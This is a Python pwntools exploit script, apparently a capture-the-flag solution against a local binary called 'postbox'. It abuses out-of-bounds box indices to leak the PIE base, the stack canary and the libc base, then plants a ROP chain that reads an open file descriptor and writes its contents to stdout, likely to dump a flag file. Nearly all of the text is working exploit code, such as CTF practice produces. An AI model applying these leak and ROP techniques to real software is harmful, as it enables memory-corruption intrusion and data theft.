from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
p = process('./postbox')
##交互函数
def menu():
    p.recvuntil(b'> \n')

def drop(box, data=b''):
    
    p.send(b'DROP\n')
    p.recvuntil(b'box:\n');   p.send(str(box).encode() + b'\n')
    p.recvuntil(b'len:\n');   p.send(str(len(data)).encode() + b'\n')
    p.recvuntil(b'letter:\n')
    if data:
        p.send(data)
    p.recvuntil(b'DROPPED\n')
    menu()

def pick(box):
    p.send(b'PICK\n')
    p.recvuntil(b'box:\n');   p.send(str(box).encode() + b'\n')
    p.recvuntil(b'PICK 32\n')
    d = p.recvn(0x20)
    p.recvuntil(b'\n')
    menu()
    return d

def repost():
    p.send(b'REPOST\n')
    p.recvuntil(b'REPOSTED\n')
    menu()

def board(last_len):
    p.send(b'BOARD\n')
    p.recvuntil(b'BOARD ')
    p.recvn(len(str(last_len)))
    d = p.recvn(last_len) if last_len else b''
    menu()
    return d

def close(timeout=3):
    p.send(b'CLOSE\n')
    p.recvuntil(b'COUNTER CLOSED\n')
    return p.recvall(timeout=timeout)

def box(i):
    return i if i <= 15 else i - (1 << 27)

POP_RDI, POP_RSI, POP_RDX_RBX = 0x23b6a, 0x2601f, 0x15fae6
READ, WRITE, RET              = 0x10e1e0, 0x10e280, 0x22679

menu()
pie  = u64(pick(box(-2))[8:16])    - 0x154d
can  = u64(pick(box(18))[24:32])               
libc = u64(pick(box(20))[24:32])  - 0x24083
#gdb.attach(p)
L = lambda off: libc + off
BUF = pie + 0x4300                      

chain  = p64(L(POP_RDI)) + p64(3)                       
chain += p64(L(POP_RSI)) + p64(BUF)                     
chain += p64(L(POP_RDX_RBX)) + p64(0x100) + p64(0)      
chain += p64(L(READ))                                   

chain += p64(L(POP_RDI)) + p64(1)                       
chain += p64(L(POP_RSI)) + p64(BUF)
chain += p64(L(POP_RDX_RBX)) + p64(0x100) + p64(0)
chain += p64(L(WRITE))  
for j in range(0, len(chain), 0x20):
    drop(box(21 + j // 0x20), chain[j:j+0x20]) 
drop(box(20), b'\x00' * 0x18 + p64(L(RET)))  
print(close())